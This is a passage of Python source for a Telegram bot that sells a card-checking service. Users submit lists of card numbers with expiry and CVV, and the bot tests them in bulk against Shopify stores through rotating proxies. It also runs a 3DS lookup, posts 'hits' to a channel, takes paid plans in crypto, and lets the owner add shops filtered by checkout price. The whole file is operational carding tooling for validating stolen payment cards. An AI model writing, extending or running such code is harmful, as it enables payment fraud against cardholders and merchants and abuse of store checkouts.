    for proc in ACTIVE_SH_SESSIONS.values():
        if proc.get("user_id") == uid and not proc.get("done"):
            return await styled_reply(event, f"{PE} {bs('Already running')} <code>/sh</code>", emoji_ids=[CE["warn"]])
    _cleanup_sh_sessions(uid)

    content = ""
    cmd_text = re.sub(r'^[/.]sh\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text:
        content = cmd_text
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm:
            return await styled_reply(event, f"{PE} {bs('Message not found')}", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                    content = await f.read()
            finally:
                try:
                    os.remove(fp)
                except Exception:
                    pass
        elif rm.text:
            content = rm.text
        else:
            return await styled_reply(event, f"{PE} {bs('No content found')}", emoji_ids=[CE["warn"]])
    else:
        return await styled_reply(event, f"{PE} {bs('Reply to .txt or text with')} <code>/sh</code>", emoji_ids=[CE["info"]])

    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, f"{PE} {bs('No valid cards')}", emoji_ids=[CE["cross"]])
    if len(cards) > SH_MAX_CARDS:
        cards = cards[:SH_MAX_CARDS]

    sites, proxies = await get_owner_check_resources("shopify")
    if not sites:
        return await styled_reply(event, f"""{PE} {bs('No shared sites available')}
{PE} {bs('Please try again later')}""", emoji_ids=[CE["warn"], CE["info"]])
    if not proxies:
        return await reply_no_proxy(event, gate="shopify")

    if uid not in ADMIN_ID and not is_paid_plan(plan):
        set_free_sp_last_use(uid)

    name, username, tag, prof = await get_user_info(uid)
    session_id = generate_session_id()
    start_session = {
        "session_id": session_id,
        "user_id": uid,
        "total": len(cards),
        "results": [],
        "start": time.time(),
        "name": name,
        "view_page": 0,
        "done": False,
        "stopped": False,
    }
    init_text, init_emoji = format_sh_message(start_session, 0)
    sm = await styled_reply(event, init_text, emoji_ids=init_emoji or None)
    start_session["msg"] = sm
    ACTIVE_SH_SESSIONS[session_id] = start_session
    log_user(uid, "SH_START", f"Cards={len(cards)} | Session={session_id}")
    asyncio.create_task(_run_sh_process(event, cards, session_id, sites, proxies, uid, plan, name, tag, prof))


@client.on(events.CallbackQuery(pattern=rb"^sh_page:([^:]+):(\d+)$"))
async def sh_page_cb(event):
    await event.answer()
    try:
        session_id = event.pattern_match.group(1).decode()
        page_index = int(event.pattern_match.group(2).decode())
        session = ACTIVE_SH_SESSIONS.get(session_id)
        if not session:
            session = await get_sh_session(session_id)
            if session:
                ACTIVE_SH_SESSIONS[session_id] = session
        if not session:
            return
        await _edit_sh_message(await event.get_message(), session, page_index=page_index)
    except Exception as e:
        log_system("SH_PAGE_ERR", str(e), "error")


@client.on(events.CallbackQuery(pattern=rb"^sh_nop:.+$"))
async def sh_nop_cb(event):
    await event.answer()


# ====================== MASS COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def msp_mass(event):
    await _mass_gate_check(event, "Shopify", "msp", None, None, is_auth_gate=False, is_shopify=True)


# ====================== /stop ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop\b'))
async def stop_cmd(event):
    uid = event.sender_id
    parts = event.raw_text.split()
    if len(parts) >= 2:
        session_id = parts[1].upper()
        proc = ACTIVE_MTXT_PROCESSES.get(session_id)
        if not proc:
            return await styled_reply(event, f"{PE} {bs('No session')} ━ <code>{session_id}</code>", emoji_ids=[CE["warn"]])
        if isinstance(proc, dict) and proc.get("user_id") != uid and uid not in ADMIN_ID:
            return await styled_reply(event, f"{PE} {bs('Not your session!')}", emoji_ids=[CE["stop"]])
        if isinstance(proc, dict):
            proc["stopped"] = True
            for task in proc.get("tasks", []):
                if not task.done():
                    task.cancel()
        log_user(uid, "STOP_CMD", f"Session={session_id}")
        return await styled_reply(event, f"{PE} {bs('Stopping')} <code>{session_id}</code>", emoji_ids=[CE["stop"]])
    user_sessions = []
    for key, proc in ACTIVE_MTXT_PROCESSES.items():
        if isinstance(proc, dict) and proc.get("user_id") == uid and not proc.get("stopped", False):
            user_sessions.append(proc.get("session_id", key))
    if not user_sessions:
        return await styled_reply(event, f"{PE} {bs('No active sessions')}", emoji_ids=[CE["warn"]])
    lines = "\n".join(f"{PE} <code>/stop {sid}</code>" for sid in user_sessions)
    await styled_reply(event, f"{PE} {bs('Your Sessions')}\n{lines}", emoji_ids=[CE["fire"]] + [CE["info"]] * len(user_sessions))


# ====================== /cmds ======================
_CMDS_SEP = "\u2500" * 22
_CMDS_ARROW = "\u21a0"

_CMDS_PAGES_PUBLIC = [
    ("Gates", [
        ("Shopify", "/sp", "Free"),
        ("Shopify Live", "/sh", "Free"),
        ("VBV Lookup", "/vbv", "Free"),
        ("Feedback", "/fb", "Free"),
    ]),
    ("Mass Gates", [
        ("Mass Shopify", "/msp", "Premium"),
        ("Stop Check", "/stop", "Premium"),
    ]),
    ("Tools", [
        ("Redeem Key", "/redeem", "Free"),
        ("Pricing", "/plan", "Free"),
        ("Commands", "/cmds", "Free"),
    ]),
]

_CMDS_PAGES_OWNER = [
    ("Gates", [
        ("Shopify", "/sp", "Free"),
        ("Shopify Live", "/sh", "Free"),
        ("VBV Lookup", "/vbv", "Free"),
        ("Feedback", "/fb", "Free"),
    ]),
    ("Mass Gates", [
        ("Mass Shopify", "/msp", "Premium"),
        ("Stop Check", "/stop", "Premium"),
    ]),
    ("Sites", [
        ("Add Site", "/add", "Owner"),
        ("Remove Site", "/rm", "Owner"),
        ("My Sites", "/sites", "Owner"),
        ("Check Site", "/site", "Owner"),
    ]),
    ("Proxy", [
        ("Add Proxy", "/addpxy", "Owner"),
        ("My Proxy", "/proxy", "Owner"),
        ("Remove Proxy", "/rmpxy", "Owner"),
        ("Check Proxy", "/chkpxy", "Owner"),
    ]),
    ("Keys", [
        ("Generate Keys", "/keys", "Owner"),
        ("Assign Key", "/key", "Owner"),
        ("Remaining Keys", "/rem", "Owner"),
        ("Revoke Plan", "/rkey", "Owner"),
        ("Redeem Key", "/redeem", "Free"),
    ]),
    ("Tools", [
        ("Pricing", "/plan", "Free"),
        ("Commands", "/cmds", "Free"),
    ]),
]


def get_cmds_pages(uid=None):
    if uid is not None and is_owner(uid):
        return _CMDS_PAGES_OWNER
    return _CMDS_PAGES_PUBLIC


def build_cmds_page_text(page_index: int, uid=None) -> str:
    try:
        pages = get_cmds_pages(uid)
        category, commands = pages[page_index]
        total_pages = len(pages)
        lines = [
            _CMDS_SEP,
            f"{bs(category)} \u00b7 {bs(f'{page_index + 1} / {total_pages}')}",
            _CMDS_SEP,
        ]
        for name, cmd, ctype in commands:
            lines.append(f"{bs('Gate')} {_CMDS_ARROW} {bs(name)}")
            lines.append(f"{bs('Cmd')} {_CMDS_ARROW} <code>{html.escape(cmd)}</code>")
            lines.append(f"{bs('Type')} {_CMDS_ARROW} {bs(ctype)}")
            lines.append(_CMDS_SEP)
        return "\n".join(lines)
    except Exception as e:
        log_system("CMDS_BUILD_ERR", str(e), "error")
        return f"{bs('Error')} \u2192 {bs('Could not build commands page.')}"


def build_cmds_buttons(page_index: int, uid=None):
    total = len(get_cmds_pages(uid))
    nav = []
    if page_index > 0:
        nav.append(pbtn("\u00ab Prev", f"page_{page_index - 1}", color="blue"))
    nav.append(pbtn(f"{page_index + 1} / {total}", "cmds_nop"))
    if page_index < total - 1:
        nav.append(pbtn("Next \u00bb", f"page_{page_index + 1}", color="blue"))
    return [nav]


@client.on(events.NewMessage(pattern=r'(?i)^[/.](cmds?|commands?)$'))
async def cmds_cmd(event):
    try:
        await ensure_user(event.sender_id)
        log_user(event.sender_id, "CMDS", f"ChatID={event.chat_id}")
        if not await force_join_check(event):
            return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
        text, entities = build_entities(build_cmds_page_text(0, event.sender_id))
        await event.reply(text, formatting_entities=entities, buttons=build_cmds_buttons(0, event.sender_id), link_preview=False)
    except Exception as e:
        log_user(event.sender_id, "CMDS_ERROR", f"Error={e}", "error")


@client.on(events.CallbackQuery(pattern=rb"^page_(\d+)$"))
async def cmds_page_cb(event):
    await event.answer()
    try:
        page_index = int(event.pattern_match.group(1).decode())
        pages = get_cmds_pages(event.sender_id)
        if page_index < 0 or page_index >= len(pages):
            return
        text, entities = build_entities(build_cmds_page_text(page_index, event.sender_id))
        await event.edit(text, formatting_entities=entities, buttons=build_cmds_buttons(page_index, event.sender_id), link_preview=False)
    except Exception as e:
        if "not modified" not in str(e).lower():
            log_system("CMDS_PAGE_ERR", str(e), "error")


@client.on(events.CallbackQuery(data=b"cmds_nop"))
async def cmds_nop_cb(event):
    await event.answer()


@client.on(events.CallbackQuery(data=b"cmds_close"))
async def cmds_close_cb(event):
    await event.answer()
    try:
        await event.delete()
    except Exception:
        pass


# ====================== /start ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]start$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        log_user(event.sender_id, "START", f"ChatID={event.chat_id}")
        if not await force_join_check(event):
            return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        name, username, tag, prof = await get_user_info(event.sender_id)
        plan_emoji = "\U0001F193"
        for pi in PLANS.values():
            if pi["tier"].lower() == plan.lower():
                plan_emoji = pi["emoji"]
                break
        credits = await get_user_credits(event.sender_id)
        credits_display = "Unlimited" if is_paid_plan(plan) or event.sender_id in ADMIN_ID else str(credits)
        joined_dt = await get_user_joined_date(event.sender_id)
        joined_str = joined_dt.strftime("%Y-%m-%d") if joined_dt else "Unknown"
        access_label = "Custom" if plan.title() == "Custom" else plan.upper()
        caption = f"""{bs('User')} {PE} {user_link_html(event.sender_id, name)}
{bs('User ID')} {PE} <code>{event.sender_id}</code>
{bs('Access')} {PE} {bs(access_label)}
{bs('Credits')} {PE} {bs(credits_display)}
{bs('Joined')} {PE} {bs(joined_str)}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{PE} {bs('Dev')} {PE} {DEV_TAG}
{PE} {bs('Version')} {PE} {bs('v2.0 (Mini)')}"""
        kb = [
            [pbtn(bs("Checker"), "rx_checker", color="blue"), pbtn(bs("Buy Now"), "show_plans", color="blue")],
            [pbtn(bs("Logs"), url=LOGS_CHANNEL_LINK, color="blue"), pbtn(bs("Hits"), url=HITS_CHANNEL_LINK, color="blue")],
            [pbtn(bs("Group"), url=JOIN_GROUP_LINK, color="blue"), pbtn(bs("Support"), url="https://t.me/ravenu899", color="blue")]
        ]
        start_emojis = [
            5220046725493828505, 5220046725493828505, 5220046725493828505,
            5220046725493828505, 5220046725493828505, 5454156248813432363,
            5220046725493828505, 5454156248813432363, 5220046725493828505
        ]
        # Deep-link helpers from redeem success (/msp)
        start_payload = ""
        try:
            raw = (event.raw_text or "").strip()
            parts = raw.split(maxsplit=1)
            if len(parts) > 1:
                start_payload = parts[1].strip().lower()
        except Exception:
            start_payload = ""
        await styled_reply(event, caption, buttons=kb, noforwards=True, emoji_ids=start_emojis)
        if start_payload in ("msp",) and is_paid_plan(plan):
            tip = f"{PE} {bs('Tip:')} <code>/{start_payload}</code> {bs('— reply to a .txt to start mass check')}"
            await styled_reply(event, tip, emoji_ids=[4902715076873553054])
    except Exception as e:
        log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")


@client.on(events.CallbackQuery(data=b"rx_checker"))
async def rx_checker_cb(event):
    await event.answer()
    caption = f"""{bs('Gates Status:')}
{bs('Gates')} {PE} <code>3</code>
{bs('Mass Gates')} {PE} <code>2</code>
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{bs('Select a Gate Category')}"""
    kb = [
        [pbtn(bs("Gates"), "rx_auth", color="blue"), pbtn(bs("Mass"), "rx_mass", color="blue")],
        [pbtn(f"\u00AB {bs('Back')}", "rx_back:main", color="red")]
    ]
    text, entities = build_entities(caption, emoji_ids=[5220046725493828505] * 2)
    try:
        await event.edit(text, formatting_entities=entities, buttons=kb)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"rx_auth"))
async def rx_auth_cb(event):
    await event.answer()
    caption = f"""{bs('Select Gate')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"""
    kb = [
        [pbtn(bs("Shopify"), "rx_gate:sp", color="blue"), pbtn(bs("VBV Lookup"), "rx_gate:vbv", color="blue")],
        [pbtn(f"\u00AB {bs('Back')}", "rx_back:checker", color="red")]
    ]
    text, entities = build_entities(caption)
    try:
        await event.edit(text, formatting_entities=entities, buttons=kb)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"rx_mass"))
async def rx_mass_cb(event):
    await event.answer()
    caption = f"""{bs('Select Mass Method')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"""
    kb = [
        [pbtn(bs("Shopify"), "rx_gate:msp", color="blue")],
        [pbtn(f"\u00AB {bs('Back')}", "rx_back:checker", color="red")]
    ]
    text, entities = build_entities(caption)
    try:
        await event.edit(text, formatting_entities=entities, buttons=kb)
    except Exception:
        pass


_GATE_INFO = {
    "sp": ("Shopify", "/sp card|mm|yy|cvv", "Charge", "\U0001F6D2"),
    "vbv": ("VBV Lookup", "/vbv card|mm|yy|cvv", "3DS", "🔐"),
    "msp": ("Shopify Mass", "/msp (reply to .txt)", "Mass", "\U0001F6D2"),
}

_GATE_BACK_MAP = {
    "sp": "auth", "vbv": "auth",
    "msp": "mass",
}


@client.on(events.CallbackQuery(pattern=rb"rx_gate:(.+)"))
async def rx_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    await event.answer()
    info = _GATE_INFO.get(gate)
    if not info:
        return
    name, cmd, gtype, emoji = info
    back_to = _GATE_BACK_MAP.get(gate, "checker")
    caption = f"""{bs('Gate')} {PE} {bs(name)}
{bs('Command')} {PE} <code>{cmd}</code>
{bs('Type')} {PE} {bs(gtype)}
{bs('Gate Health')} {PE} <code>{await _get_gate_health(gate)}</code>
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"""
    kb = [[pbtn(f"\u00AB {bs('Back')}", f"rx_back:{back_to}", color="red")]]
    text, entities = build_entities(caption, emoji_ids=[5220046725493828505] * 4)
    try:
        await event.edit(text, formatting_entities=entities, buttons=kb)
    except Exception:
        pass


@client.on(events.CallbackQuery(pattern=rb"rx_back:(.+)"))
async def rx_back_cb(event):
    target = event.pattern_match.group(1).decode()
    await event.answer()
    if target == "main":
        uid = event.sender_id
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        name, username, tag, prof = await get_user_info(uid)
        plan_emoji = "\U0001F193"
        for pi in PLANS.values():
            if pi["tier"].lower() == plan.lower():
                plan_emoji = pi["emoji"]
                break
        credits = await get_user_credits(uid)
        credits_display = "Unlimited" if is_paid_plan(plan) or uid in ADMIN_ID else str(credits)
        joined_dt = await get_user_joined_date(uid)
        joined_str = joined_dt.strftime("%Y-%m-%d") if joined_dt else "Unknown"
        access_label = "Custom" if plan.title() == "Custom" else plan.upper()
        caption = f"""{bs('User')} {PE} {user_link_html(uid, name)}
{bs('User ID')} {PE} <code>{uid}</code>
{bs('Access')} {PE} {bs(access_label)}
{bs('Credits')} {PE} <code>{credits_display}</code>
{bs('Joined')} {PE} <code>{joined_str}</code>
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{PE} {bs('Dev')} {PE} {DEV_TAG}
{PE} {bs('Version')} {PE} {bs('v2.0 (Mini)')}"""
        kb = [
            [pbtn(bs("Checker"), "rx_checker", color="blue"), pbtn(bs("Buy Now"), "show_plans", color="blue")],
            [pbtn(bs("Logs"), url=LOGS_CHANNEL_LINK, color="blue"), pbtn(bs("Hits"), url=HITS_CHANNEL_LINK, color="blue")],
            [pbtn(bs("Group"), url=JOIN_GROUP_LINK, color="blue"), pbtn(bs("Support"), url="https://t.me/ravenu899", color="blue")]
        ]
        start_emojis = [
            5220046725493828505, 5220046725493828505, 5220046725493828505,
            5220046725493828505, 5220046725493828505, 5454156248813432363,
            5220046725493828505, 5454156248813432363, 5220046725493828505
        ]
        text, entities = build_entities(caption, emoji_ids=start_emojis)
        try:
            await event.edit(text, formatting_entities=entities, buttons=kb)
        except Exception:
            pass
    elif target == "checker":
        caption = f"""{bs('Gates Status:')}
{bs('Gates')} {PE} <code>2</code>
{bs('Mass Gates')} {PE} <code>2</code>
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{bs('Select a Gate Category')}"""
        kb = [
            [pbtn(bs("Auth"), "rx_auth", color="blue"), pbtn(bs("Charge"), "rx_charge", color="blue")],
            [pbtn(bs("Mass"), "rx_mass", color="blue")],
            [pbtn(f"\u00AB {bs('Back')}", "rx_back:main", color="red")]
        ]
        text, entities = build_entities(caption, emoji_ids=[5220046725493828505] * 2)
        try:
            await event.edit(text, formatting_entities=entities, buttons=kb)
        except Exception:
            pass
    elif target == "auth":
        caption = f"""{bs('Select Gate')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"""
        kb = [
            [pbtn(bs("Shopify"), "rx_gate:sp", color="blue"), pbtn(bs("VBV Lookup"), "rx_gate:vbv", color="blue")],
            [pbtn(f"\u00AB {bs('Back')}", "rx_back:checker", color="red")]
        ]
        text, entities = build_entities(caption)
        try:
            await event.edit(text, formatting_entities=entities, buttons=kb)
        except Exception:
            pass
    elif target == "mass":
        caption = f"""{bs('Select Mass Method')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"""
        kb = [
            [pbtn(bs("Shopify"), "rx_gate:msp", color="blue")],
            [pbtn(f"\u00AB {bs('Back')}", "rx_back:checker", color="red")]
        ]
        text, entities = build_entities(caption)
        try:
            await event.edit(text, formatting_entities=entities, buttons=kb)
        except Exception:
            pass


@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID:
        return await event.answer(f"✓ {bs('Admin')}!")
    _JOIN_CACHE.pop(uid, None)
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✓ {bs('Access granted! You can now use the bot.')}", alert=True)
        try:
            await styled_edit(
                await event.get_message(),
                f"""{bs('Welcome')} {PE}
{PE} {bs('You have successfully joined the group and channel.')}
{PE} <code>/start</code> {bs('for commands')}""",
                emoji_ids=[5319007286004299794, 5319248624511631572, 5258500422393415126]
            )
        except Exception:
            pass
    else:
        await event.answer(f"✗ {bs('You still need to join both!')}", alert=True)


@client.on(events.CallbackQuery(pattern=rb"^(show_plans|menu_pricing)$"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id)
    await event.answer()
    text = f"""⚡ <b>Available Access Plans</b>
━━━━━━━━━━━━━━━━━━
<pre>𝑪𝒐𝒓𝒆 𝑨𝒄𝒄𝒆𝒔🛠️</pre>
<b>Duration ↬</b> <i>7 days</i>
<b>Price ↬</b> <i>{PLANS['plan1']['price']}</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑬𝒍𝒊𝒕𝒆 𝑨𝒄𝒄𝒆𝒔⭐</pre>
<b>Duration ↬</b> <i>15 days</i>
<b>Price ↬</b> <i>{PLANS['plan2']['price']}</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑹𝒐𝒐𝒕 𝑨𝒄𝒄𝒆𝒔👑</pre>
<b>Duration ↬</b> <i>30 days</i>
<b>Price ↬</b> <i>{PLANS['plan3']['price']}</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑿-𝑨𝒄𝒄𝒆𝒔👑</pre>
<b>Duration ↬</b> <i>90 days</i>
<b>Price ↬</b> <i>{PLANS['plan4']['price']}</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<b>Current Plan ↬</b> <code>{cp.upper()}</code>"""

    kb = [
        [pbtn(bs("Buy Now"), "buy_now_menu", color="green")],
        [pbtn(bs("Back"), "rx_back:main", color="red")]
    ]
    text_clean, entities = build_entities(text)
    try:
        await event.edit(text_clean, formatting_entities=entities, buttons=kb)
    except Exception:
        pass


@client.on(events.CallbackQuery(pattern=rb"^(buy_now|buy_now_menu)$"))
async def buy_now_cb(event):
    await event.answer()
    text = """💳 <b>Payment Options</b>
━━━━━━━━━━━━━━━━━━
<b>USDT (BEP20)</b>
<code>N/A</code>
━━━━━━━━━━━━━━━━━━
<b>USDT (TRC20)</b>
<code>N/A</code>
━━━━━━━━━━━━━━━━━━
<b>BITCOIN (BTC)</b>
<code>N/A</code>
━━━━━━━━━━━━━━━━━━
<b>SOLANA (SQL)</b>
<code>N/A</code>
━━━━━━━━━━━━━━━━━━
<b>BINANCE ID</b>
<code>854274954</code>
━━━━━━━━━━━━━━━━━━
<b>⚠️ After payment, contact admin</b>
<a href="https://t.me/ravenu899">@ravenu899</a>"""

    kb = [
        [pbtn(bs("Back"), "show_plans", color="red")]
    ]
    text_clean, entities = build_entities(text)
    try:
        await event.edit(text_clean, formatting_entities=entities, buttons=kb)
    except Exception:
        pass

# ====================== plans_cb ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if not await force_join_check(event):
        return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    cp = await get_user_plan(event.sender_id)
    text = f"""⚡ <b>Available Access Plans</b>
━━━━━━━━━━━━━━━━━━
<pre>𝑪𝒐𝒓𝒆 𝑨𝒄𝒄𝒆𝒔🛠️</pre>
<b>Duration ↬</b> <i>7 days</i>
<b>Price ↬</b> <i>{PLANS['plan1']['price']}</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑬𝒍𝒊𝒕𝒆 𝑨𝒄𝒄𝒆𝒔⭐</pre>
<b>Duration ↬</b> <i>15 days</i>
<b>Price ↬</b> <i>{PLANS['plan2']['price']}</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑹𝒐𝒐𝒕 𝑨𝒄𝒄𝒆𝒔👑</pre>
<b>Duration ↬</b> <i>30 days</i>
<b>Price ↬</b> <i>{PLANS['plan3']['price']}</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑿-𝑨𝒄𝒄𝒆𝒔👑</pre>
<b>Duration ↬</b> <i>90 days</i>
<b>Price ↬</b> <i>{PLANS['plan4']['price']}</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<b>Current Plan ↬</b> <code>{cp.upper()}</code>"""

    kb = [
        [pbtn(bs("Buy Now"), "buy_now_menu", color="green")],
        [pbtn(bs("Back"), "rx_back:main", color="red")]
    ]
    await styled_reply(event, text, buttons=kb)


# ====================== SITE MANAGEMENT ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    try:
        sta = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm and rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                        sta = extract_urls_from_text(await f.read())
                finally:
                    try:
                        os.remove(fp)
                    except:
                        pass
            elif rm and rm.text:
                sta = extract_urls_from_text(rm.text)
        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if add_text:
            for s in extract_urls_from_text(add_text):
                if s not in sta:
                    sta.append(s)
        if not sta:
            return await styled_reply(event, SITE_USAGE_TEXT, emoji_ids=SITE_USAGE_EMOJIS)

        # Deduplicate input first; existing-site filter happens in add_gate_cb
        new_sites = []
        seen = set()
        for site in sta:
            n = normalize_site_url(site)
            if n and n not in seen:
                seen.add(n)
                new_sites.append(n)

        if not new_sites:
            return await styled_reply(event, f"{PE} {bs('No valid sites found')}", emoji_ids=[CE["cross"]])

        log_user(event.sender_id, "ADD_SITE_START", f"Found {len(new_sites)} site(s)")

        uid = event.sender_id
        PENDING_ADD_SITES[uid] = {"sites": new_sites, "event": event}

        kb = [
            [pbtn(bs("Shopify"), f"addgate:shopify:{uid}", color="blue")],
        ]
        await styled_reply(event, f"""⭐  {bs('Select Price Range')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Sites parsed ━')} {len(new_sites)}
━━━━━━━━━━━━━━━━━
⭐ {bs('Shopify')} → {bs('price filter + shared Shopify pool')}""", buttons=kb, emoji_ids=[
            5855207143724027916,
            4902715076873553054,
            5980995951160987855,
        ])

    except Exception as e:
        log_user(event.sender_id, "ADD_SITE_ERROR", f"Error={e}", "error")
        await styled_reply(event, f"{PE} {bs('Error')} ━ <code>{e}</code>", emoji_ids=[CE["cross"]])


@client.on(events.CallbackQuery(pattern=rb"addgate:(shopify):(\d+)"))
async def add_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid:
        return await safe_callback_answer(event, f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_SITES.get(uid)
    if not data:
        return await safe_callback_answer(event, f"{bs('Expired')}!", alert=True)

    # Answer immediately — filtering thousands of sites can outlive Telegram's query TTL
    await safe_callback_answer(event, f"{bs('Processing')}...")

    sites = list(data.get("sites") or [])
    if gate == "shopify":
        existing_norm = {normalize_site_url(s) for s in await get_shopify_sites()}
        current_site_count = len(existing_norm)
        if current_site_count >= MAX_SITES:
            PENDING_ADD_SITES.pop(uid, None)
            try:
                await event.edit(f"⭐ {bs('Site limit reached')}")
            except Exception:
                pass
            return
        new_sites, already_exists, seen_new = [], [], set()
        for site in sites:
            n = normalize_site_url(site)
            if not n:
                continue
            if n in existing_norm:
                already_exists.append(n)
            elif n not in seen_new:
                seen_new.add(n)
                new_sites.append(n)
        remaining_slots = MAX_SITES - current_site_count
        if len(new_sites) > remaining_slots:
            new_sites = new_sites[:remaining_slots]
        if not new_sites:
            PENDING_ADD_SITES.pop(uid, None)
            try:
                await event.edit(f"⭐ {bs('All sites already exist')}")
            except Exception:
                pass
            return
        PENDING_ADD_SITES[uid] = {
            "sites": new_sites,
            "exists": already_exists,
            "event": data["event"],
            "gate": "shopify",
        }
        kb = [
            [pbtn(f"{bs('0-5 USD')}", f"addprice:5:{uid}", color="blue"), pbtn(f"{bs('0-10 USD')}", f"addprice:10:{uid}", color="blue")],
            [pbtn(f"{bs('0-20 USD')}", f"addprice:20:{uid}", color="blue"), pbtn(f"{bs('0-40 USD')}", f"addprice:40:{uid}", color="blue")]
        ]
        caption = f"""⭐  {bs('Select Price Range')}
━━━━━━━━━━━━━━━━━
⭐ {bs('New Sites ━')} {len(new_sites)}
⭐ {bs('Already Exist ━')} {len(already_exists)}
━━━━━━━━━━━━━━━━━
⭐ {bs('Only working sites within price range will be added')}"""
        text, entities = build_entities(caption, emoji_ids=[
            5855207143724027916,
            4902715076873553054,
            4902715076873553054,
            5980995951160987855,
        ])
        try:
            await event.edit(text, formatting_entities=entities, buttons=kb, link_preview=False)
        except Exception:
            pass
        return


@client.on(events.CallbackQuery(pattern=rb"addprice:(\d+):(\d+)"))
async def add_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid:
        return await safe_callback_answer(event, f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_SITES.pop(uid, None)
    if not data:
        return await safe_callback_answer(event, f"{bs('Expired')}!", alert=True)
    if uid in ACTIVE_ADD_PROCESSES:
        return await safe_callback_answer(event, f"{bs('Already running')}!", alert=True)
    ACTIVE_ADD_PROCESSES[uid] = True
    await safe_callback_answer(event, f"{bs('Testing sites')}...")
    try:
        await event.delete()
    except Exception:
        pass
    asyncio.create_task(_process_add_sites(data["event"], data["sites"], data.get("exists") or [], max_price))


async def _process_add_sites(event, new_sites, already_exists, max_price):
    uid = event.sender_id
    total = len(new_sites)
    tested = 0
    working = 0
    dead = 0
    added_to_db = 0
    chat_id = event.chat_id

    proxies = await get_all_user_proxies(uid, gate="shopify")

    log_user(uid, "ADD_TEST_START", f"Testing {total} sites | MaxPrice=${max_price} | Proxies={len(proxies)}")

    current_sites = await get_shopify_sites()
    remaining_slots = MAX_SITES - len(current_sites)

    sm = await styled_reply(event, f"""⭐ {bs('Testing Sites...')}

⭐ {bs(f'Parsed: {total} | Testing in batches of {SITE_WORKERS}...')}
⭐ {bs(f'Will stop at {remaining_slots} working sites.')}""", emoji_ids=[
        5325834523068342417,
        5215327832040811010,
        5084974483685507801,
    ])

    last_ui = [0]
    ui_lock = asyncio.Lock()
    working_sites_data = []

    def is_stopped():
